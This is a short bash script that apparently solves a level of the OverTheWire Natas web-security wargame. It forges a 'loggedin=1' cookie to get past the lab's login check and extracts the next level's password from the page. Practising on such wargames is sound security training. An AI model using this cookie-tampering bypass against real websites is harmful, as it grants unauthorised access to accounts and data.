#!/bin/bash
if [ $# -eq 0 ]
  then echo "Please pass the password as argument"
else
  curl -s --cookie "loggedin=1" http://natas5:$1@natas5.natas.labs.overthewire.org/ | grep -E -o 'The password for natas6 is .{32}'
fi
